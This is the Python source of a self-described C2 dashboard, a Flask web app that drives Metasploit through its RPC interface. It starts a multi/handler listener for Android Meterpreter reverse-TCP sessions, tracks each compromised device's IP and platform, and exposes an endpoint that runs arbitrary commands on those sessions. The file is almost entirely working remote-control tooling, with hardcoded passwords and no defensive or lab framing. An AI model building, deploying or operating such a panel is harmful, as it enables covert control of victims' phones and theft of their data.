#!/usr/bin/env python3
# HAMZA SKU - Simple Working Version

from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from flask_socketio import SocketIO, emit
from pymetasploit3.msfrpc import MsfRpcClient
import hashlib
import os
import time
import threading

app = Flask(__name__)
app.config['SECRET_KEY'] = 'hamza_secret_2026'
socketio = SocketIO(app, cors_allowed_origins="*")

os.makedirs('templates', exist_ok=True)
os.makedirs('downloads', exist_ok=True)

# Password: hamza_sku_2026
CORRECT_HASH = '6078c92c7bc2e14f4d2bf1037d62514d8dd9ccd32573b1694cc640347b80d945'

msf = None
console = None
running = False
sessions = {}

def connect_msf():
    global msf
    try:
        msf = MsfRpcClient('msf_password', server='127.0.0.1', port=55553, ssl=False)
        print("[+] Connected to MSF")
        return True
    except:
        try:
            msf = MsfRpcClient('msf_password', server='127.0.0.1', port=55553, ssl=True)
            print("[+] Connected to MSF (SSL)")
            return True
        except Exception as e:
            print(f"[-] Failed: {e}")
            return False

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        pwd = request.json.get('password', '')
        if hashlib.sha256(pwd.encode()).hexdigest() == CORRECT_HASH:
            session['auth'] = True
            return jsonify({'success': True})
        return jsonify({'success': False, 'message': 'Wrong password'})
    
    if session.get('auth'):
        return redirect('/')
    return render_template('login.html')

@app.route('/')
def index():
    if not session.get('auth'):
        return redirect('/login')
    return render_template('setup.html')

@app.route('/dashboard')
def dashboard():
    if not session.get('auth'):
        return redirect('/login')
    return render_template('dashboard.html')

@app.route('/session/<session_id>')
def session_page(session_id):
    if not session.get('auth'):
        return redirect('/login')
    return render_template('session.html', session_id=session_id)

@app.route('/api/handler/start', methods=['POST'])
def start_handler():
    global console, running, msf
    
    if not session.get('auth'):
        return jsonify({'success': False, 'message': 'Not authenticated'})
    
    if not msf:
        if not connect_msf():
            return jsonify({'success': False, 'message': 'MSF connection failed'})
    
    try:
        d = request.json
        host = d.get('host', '0.0.0.0')
        port = d.get('port', 4444)
        payload = d.get('payload', 'android/meterpreter/reverse_tcp')
        
        console = msf.consoles.console()
        
        console.write('use exploit/multi/handler')
        time.sleep(0.3)
        console.write(f'set PAYLOAD {payload}')
        time.sleep(0.3)
        console.write(f'set LHOST {host}')
        time.sleep(0.3)
        console.write(f'set LPORT {port}')
        time.sleep(0.3)
        console.write('set ExitOnSession false')
        time.sleep(0.3)
        console.write('exploit -j')
        time.sleep(1)
        
        out = console.read()
        print(out.get('data', ''))
        
        running = True
        threading.Thread(target=check_sessions, daemon=True).start()
        
        return jsonify({'success': True, 'message': f'Started on {host}:{port}'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/handler/stop', methods=['POST'])
def stop_handler():
    global running, console, msf
    
    if not session.get('auth'):
        return jsonify({'success': False})
    
    running = False
    
    try:
        if console:
            console.destroy()
        if msf:
            for jid in list(msf.jobs.list.keys()):
                msf.jobs.stop(jid)
    except:
        pass
    
    return jsonify({'success': True, 'message': 'Stopped'})

@app.route('/api/handler/status')
def handler_status():
    if not session.get('auth'):
        return jsonify({'active': False, 'msf_connected': False})
    return jsonify({'active': running, 'msf_connected': msf is not None})

@app.route('/api/sessions')
def get_sessions():
    if not session.get('auth'):
        return jsonify({'sessions': [], 'count': 0})
    return jsonify({'sessions': list(sessions.values()), 'count': len(sessions)})

@app.route('/api/command', methods=['POST'])
def run_command():
    if not session.get('auth'):
        return jsonify({'success': False, 'message': 'Not authenticated'})
    
    global msf
    
    try:
        data = request.json
        session_id = data.get('session_id')
        command = data.get('command', '').strip()
        
        if not command:
            return jsonify({'success': False, 'output': 'Empty command'})
        
        if not msf:
            return jsonify({'success': False, 'output': 'MSF not connected'})
        
        # Execute command on session
        sess = msf.sessions.session(session_id)
        output = sess.run_with_output(command, timeout=30)
        
        return jsonify({
            'success': True,
            'output': output,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'output': str(e)
        })

def check_sessions():
    global sessions, msf
    while running:
        try:
            if msf:
                for sid, info in msf.sessions.list.items():
                    if sid not in sessions:
                        ip = info.get('tunnel_peer', '').split(':')[0] or 'Unknown'
                        sessions[sid] = {
                            'id': sid,
                            'ip': ip,
                            'type': info.get('type'),
                            'platform': info.get('platform'),
                            'status': 'online'
                        }
                        print(f"[+] New session: {sid} from {ip}")
                        socketio.emit('new_session', sessions[sid], broadcast=True)
        except:
            pass
        time.sleep(5)

@socketio.on('connect')
def on_connect():
    emit('connected', {'status': 'ok'})

if __name__ == '__main__':
    print("""
╔════════════════════════════════════════╗
║       HAMZA SKU C2 Dashboard           ║
╚════════════════════════════════════════╝

[!] Start msfrpcd first:
    msfrpcd -P msf_password -S -a 127.0.0.1

[!] Then open:
    http://localhost:5000

[!] Password:
    hamza_sku_2026
""")
    
    connect_msf()
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
